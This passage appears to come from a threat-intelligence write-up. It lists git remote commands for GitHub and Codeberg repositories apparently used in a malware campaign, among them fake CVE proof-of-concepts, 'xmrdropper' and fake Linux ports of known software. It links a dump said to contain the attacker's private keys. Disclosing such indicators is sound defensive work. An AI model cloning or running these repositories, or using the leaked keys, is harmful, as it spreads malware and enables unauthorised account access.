git remote add origin git@github.com:reneww/poc-CVE-2020-25223.git
git remote add origin git@github.com:n0s3ns33/poc-cve-2023-21716.git
git remote add origin git@github.com:n0s3ns33/poc-cve-2023-21716.git
git remote add origin git@codeberg.org:aib0lit/xmrdropper.git
git remote add origin git@codeberg.org:aib0lit/xsession.git
git remote add origin git@codeberg.org:paulmuller/xmrdropper.git
git remote add origin git@github.com:gh-2025-02/poc-cve-2020-25223.git
git remote add origin git@github.com:gh202503/poc-cve-2020-35489.git
git remote add origin git@github.com:c33d3r20/shareaza-for-linux.git
git remote add origin git@github.com:al1enb1t/cheatengine-for-linux.git
git remote add origin git@github.com:PavelMarchine/ansys-for-linux.git
git remote add origin git@github.com:alexmarshall20/poc-cve-2019-11248.git
git remote add origin git@codeberg.org:bluef1sher/poc-cve-2019-11248.git
git remote add origin git@codeberg.org:bluef1sher/poc-cve-2020-1938.git
git remote add origin git@codeberg.org:bluef1sher/poc-cve-2001-1473.git
git remote add origin git@codeberg.org:bluef1sher/poc-cve-2021-31755.git
git remote add origin git@codeberg.org:bluef1sher/poc-cve-2023-21716.git
git remote add origin git@codeberg.org:bluef1sher/poc-cve-2024-5057.git
git remote add origin https://codeberg.org/bluef1sher/poc-cve-2023-3824.git
git remote add origin git@codeberg.org:bluef1sher/poc-cve-2023-3824.git
```

You can download the full dump here:

[https://chocapikk.com/ioc/s1nk.zip](https://chocapikk.com/ioc/s1nk.zip)

There’s private keys for all repos he used to create these attacks.
